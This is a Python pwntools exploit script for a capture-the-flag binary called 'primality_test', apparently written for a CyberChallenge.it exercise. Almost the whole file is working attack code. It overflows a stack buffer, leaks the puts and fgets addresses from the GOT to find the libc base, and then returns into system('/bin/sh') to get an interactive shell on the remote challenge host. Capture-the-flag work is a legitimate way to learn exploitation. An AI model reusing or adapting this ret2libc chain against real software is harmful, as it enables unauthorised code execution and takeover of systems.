#!/usr/bin/env python3

from pwn import *


exe = ELF("./primality_test")
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")	# Found in some LIBC DBs
context.binary = exe


PADDING		= b'A' * 80
MAIN_ADDR	= 0x080484f0	# Manually set beacuse Pwntools can't find the symbol (works if PIE is disabled!)


def conn():
	global r	# Make it global inside the function :)

	if args.LOCAL:
		r = process([exe.path])

		if args.PLT_DEBUG:
			gdb.attach(r)
	else:
		r = remote("rop.challs.cyberchallenge.it", 9130)

	return r


def spawn_shell(libc_address: int):

	# Address of 'system' function
	system_addr = libc_address + libc.symbols['system']
	# system_addr = 0xf7c49b50

	# Address of "/bin/sh" string in libc
	bin_sh = libc_address + next(libc.search(b'/bin/sh\x00'))

	# Crafting payload
	payload =  PADDING
	payload += p32(system_addr)		# Overwrite EIP with 'system' function address
	payload += p32(0x41424344)		# Dummy return address
	payload += p32(bin_sh)			# "/bin/sh" to spawn

	# Sending payload
	r.readline()	# Clear first line
	r.sendlineafter("number: ", payload)
	r.interactive()


def leak_func_address(func: str):

	# PLT entry
	puts_plt = exe.plt['puts']

	# GOT entry
	got_entry = exe.got[func]

	# Crafting payload
	payload =  PADDING
	payload += p32(puts_plt)		# Overwrite EIP with PUTS PLT entry
	payload += p32(MAIN_ADDR)		# PUTS 'ret' will return to MAIN so we can abuse BOF again
	payload += p32(got_entry)		# Target to Leak

	# Sending payload
	r.readline()	# Clear first line
	r.sendlineafter("number: ", payload)
	output = r.recvlines(2)

	# Print for logging
	leak = u32(output[1][:4].ljust(4))
	log.warn(f'"{func}" leaked address: {hex(leak)}')

	return leak


def leak_libc_address(addresses: dict[int]):
	libc_addresses = set()	# Set is used to check wheter we did find the same address
							# or we messed up everything (in that case, redo the process)

	for func, leaked_addr in addresses.items():
		libc_addresses.add(leaked_addr - libc.symbols[func])

	if len(libc_addresses) != 1:
		log.err(f'Libc addresses differ from each other!')
		exit(-1)

	libc_addr = libc_addresses.pop()
	log.warn(f'LIBC Leaked Address: {hex(libc_addr)}')

	return libc_addr


def main():
	r = conn()

	# Per trovare il punto in cui inizia a sovrascrivere l'Instruction Pointer
	# NOTA: L'indirizzo è stato trovato con il debugger
	# cyclic -n 4 100
	# cyclic -n 4 -l 0x61616175	-->	80

	puts_addr		= leak_func_address('puts')
	fgets_addr		= leak_func_address('fgets')
	libc_address 	= leak_libc_address({'puts': puts_addr, 'fgets': fgets_addr})

	spawn_shell(libc_address)


if __name__ == "__main__":
	main()
